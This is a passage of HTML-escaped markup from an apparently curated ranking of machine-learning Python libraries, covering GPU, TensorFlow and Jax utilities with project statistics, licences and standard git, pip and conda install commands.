⏱️ 30.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/BlazingDB/blazingsql&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/blazingsql/blazingsql-protocol&#34;&gt;Conda&lt;/a&gt; (📥 940 · ⏱️ 11.11.2019):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c blazingsql blazingsql-protocol&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/KomputeProject/kompute&#34;&gt;Vulkan Kompute&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 870) - General purpose GPU compute framework built on Vulkan to.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/KomputeProject/kompute&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 19 · 🔀 61 · 📥 160 · 📦 3 · 📋 180 - 32% open · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/KomputeProject/kompute&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/kp&#34;&gt;PyPi&lt;/a&gt; (📥 130 / month · ⏱️ 13.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install kp&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/rapidsai/cusignal&#34;&gt;cuSignal&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 600) - GPU accelerated signal processing. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/rapidsai/cusignal&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 38 · 🔀 91 · 📋 130 - 11% open · ⏱️ 23.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/rapidsai/cusignal&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 5 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/anderskm/gputil&#34;&gt;GPUtil&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 870 · 💀) - A Python module for getting the GPU status from NVIDA GPUs using.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/fbcotter/py3nvml&#34;&gt;py3nvml&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 200) - Python 3 Bindings for NVML library. Get NVIDIA GPU status inside your.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/nicolargo/nvidia-ml-py3&#34;&gt;nvidia-ml-py3&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 79 · 💀) - Python 3 Bindings for the NVIDIA Management Library. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Santosh-Gupta/SpeedTorch&#34;&gt;SpeedTorch&lt;/a&gt;&lt;/b&gt; (🥉15 · ⭐ 650 · 💀) - Library for faster pinned CPU - GPU transfer in Pytorch. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/stas00/ipyexperiments&#34;&gt;ipyexperiments&lt;/a&gt;&lt;/b&gt; (🥉14 · ⭐ 150) - jupyter/ipython experiment containers for GPU and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Tensorflow Utilities&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries that extend TensorFlow with additional capabilities.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorflow/addons&#34;&gt;TF Addons&lt;/a&gt;&lt;/b&gt; (🥇36 · ⭐ 1.5K) - Useful extra functionality for TensorFlow 2.x maintained by.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorflow/addons&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 190 · 🔀 510 · 📦 6.4K · 📋 930 - 23% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorflow/addons&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tensorflow-addons&#34;&gt;PyPi&lt;/a&gt; (📥 1.4M / month · 📦 170 · ⏱️ 21.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tensorflow-addons&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorflow/datasets&#34;&gt;TensorFlow Datasets&lt;/a&gt;&lt;/b&gt; (🥇35 · ⭐ 3.3K) - TFDS is a collection of datasets ready to use with.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorflow/datasets&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 250 · 🔀 1.3K · 📋 1.2K - 47% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorflow/datasets&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tensorflow-datasets&#34;&gt;PyPi&lt;/a&gt; (📥 1.2M / month · 📦 160 · ⏱️ 31.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tensorflow-datasets&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/tensorflow-datasets&#34;&gt;Conda&lt;/a&gt; (📥 4.6K · ⏱️ 17.08.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge tensorflow-datasets&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorflow/hub&#34;&gt;tensorflow-hub&lt;/a&gt;&lt;/b&gt; (🥇35 · ⭐ 3.1K) - A library for transfer learning by reusing parts of.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorflow/hub&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 90 · 🔀 1.6K · 📦 12K · 📋 640 - 2% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorflow/hub&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tensorflow-hub&#34;&gt;PyPi&lt;/a&gt; (📥 5.3M / month · 📦 280 · ⏱️ 14.04.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tensorflow-hub&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/tensorflow-hub&#34;&gt;Conda&lt;/a&gt; (📥 63K · ⏱️ 18.04.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge tensorflow-hub&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorflow/tensor2tensor&#34;&gt;tensor2tensor&lt;/a&gt;&lt;/b&gt; (🥈34 · ⭐ 12K) - Library of deep learning models and datasets designed to.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorflow/tensor2tensor&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 240 · 🔀 3K · 📦 1.2K · 📋 1.2K - 45% open · ⏱️ 15.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorflow/tensor2tensor&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tensor2tensor&#34;&gt;PyPi&lt;/a&gt; (📥 12K / month · 📦 93 · ⏱️ 17.06.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tensor2tensor&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorflow/transform&#34;&gt;TensorFlow Transform&lt;/a&gt;&lt;/b&gt; (🥈33 · ⭐ 920) - Input pipeline framework. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorflow/transform&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 27 · 🔀 200 · 📦 870 · 📋 190 - 19% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorflow/transform&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tensorflow-transform&#34;&gt;PyPi&lt;/a&gt; (📥 3.4M / month · 📦 56 · ⏱️ 13.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tensorflow-transform&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorflow/model-optimization&#34;&gt;TF Model Optimization&lt;/a&gt;&lt;/b&gt; (🥈32 · ⭐ 1.2K) - A toolkit to optimize ML models for deployment for.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorflow/model-optimization&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 67 · 🔀 280 · 📦 1.8K · 📋 320 - 52% open · ⏱️ 16.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorflow/model-optimization&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tensorflow-model-optimization&#34;&gt;PyPi&lt;/a&gt; (📥 170K / month · 📦 20 · ⏱️ 18.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tensorflow-model-optimization&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/keras-team/keras-preprocessing&#34;&gt;Keras-Preprocessing&lt;/a&gt;&lt;/b&gt; (🥉29 · ⭐ 1K) - Utilities for working with image data, text data, and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/keras-team/keras-preprocessing&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 52 · 🔀 440 · 📋 200 - 47% open · ⏱️ 17.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/keras-team/keras-preprocessing&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/keras-preprocessing&#34;&gt;PyPi&lt;/a&gt; (📥 10M / month · 📦 1.5K · ⏱️ 14.05.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install keras-preprocessing&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/keras-preprocessing&#34;&gt;Conda&lt;/a&gt; (📥 1.3M · ⏱️ 15.01.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge keras-preprocessing&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorflow/io&#34;&gt;TensorFlow I/O&lt;/a&gt;&lt;/b&gt; (🥉29 · ⭐ 560) - Dataset, streaming, and file system extensions.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorflow/io&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 94 · 🔀 230 · 📋 520 - 35% open · ⏱️ 17.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorflow/io&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tensorflow-io&#34;&gt;PyPi&lt;/a&gt; (📥 200K / month · 📦 24 · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tensorflow-io&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/qubvel/efficientnet&#34;&gt;efficientnet&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 2K · 💤) - Implementation of EfficientNet model. Keras and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/qubvel/efficientnet&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 10 · 🔀 460 · 📥 240K · 📦 1K · 📋 120 - 51% open · ⏱️ 16.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/qubvel/efficientnet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/efficientnet&#34;&gt;PyPi&lt;/a&gt; (📥 130K / month · 📦 10 · ⏱️ 15.09.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install efficientnet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/anaconda/efficientnet&#34;&gt;Conda&lt;/a&gt; (📥 58 · ⏱️ 14.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c anaconda efficientnet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorflow/neural-structured-learning&#34;&gt;Neural Structured Learning&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 920) - Training neural models with structured signals. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorflow/neural-structured-learning&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 33 · 🔀 170 · 📦 230 · 📋 62 - 4% open · ⏱️ 09.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorflow/neural-structured-learning&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/neural-structured-learning&#34;&gt;PyPi&lt;/a&gt; (📥 16K / month · 📦 2 · ⏱️ 18.08.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install neural-structured-learning&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorflow/cloud&#34;&gt;TensorFlow Cloud&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 330) - The TensorFlow Cloud repository provides APIs that.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorflow/cloud&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 27 · 🔀 69 · 📦 150 · 📋 81 - 67% open · ⏱️ 24.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorflow/cloud&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tensorflow-cloud&#34;&gt;PyPi&lt;/a&gt; (📥 170K / month · 📦 1 · ⏱️ 17.06.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tensorflow-cloud&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorflow/compression&#34;&gt;TF Compression&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 610) - Data compression in TensorFlow. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorflow/compression&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 13 · 🔀 210 · 📋 83 - 2% open · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorflow/compression&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tensorflow-compression&#34;&gt;PyPi&lt;/a&gt; (📥 1.1K / month · 📦 1 · ⏱️ 16.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tensorflow-compression&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/geffy/tffm&#34;&gt;tffm&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 780) - TensorFlow implementation of an arbitrary order Factorization Machine. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/geffy/tffm&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 10 · 🔀 190 · 📦 11 · 📋 40 - 45% open · ⏱️ 17.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/geffy/tffm&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tffm&#34;&gt;PyPi&lt;/a&gt; (📥 1.9K / month · 📦 1 · ⏱️ 17.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tffm&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/PAIR-code/saliency&#34;&gt;Saliency&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 790) - Framework-agnostic implementation for state-of-the-art saliency.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/PAIR-code/saliency&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 15 · 🔀 160 · 📦 28 · 📋 40 - 35% open · ⏱️ 13.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/PAIR-code/saliency&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/saliency&#34;&gt;PyPi&lt;/a&gt; (📥 630 / month · 📦 3 · ⏱️ 03.05.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install saliency&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 1 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/taehoonlee/tensornets&#34;&gt;TensorNets&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 1K · 💀) - High level network definitions with pre-trained weights in.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Jax Utilities&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries that extend Jax with additional capabilities.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/patrick-kidger/equinox&#34;&gt;equinox&lt;/a&gt;&lt;/b&gt; (🥇23 · ⭐ 560) - Callable PyTrees and filtered transforms = neural networks in.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://jax.readthedocs.io/en/latest/_static/favicon.png&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; 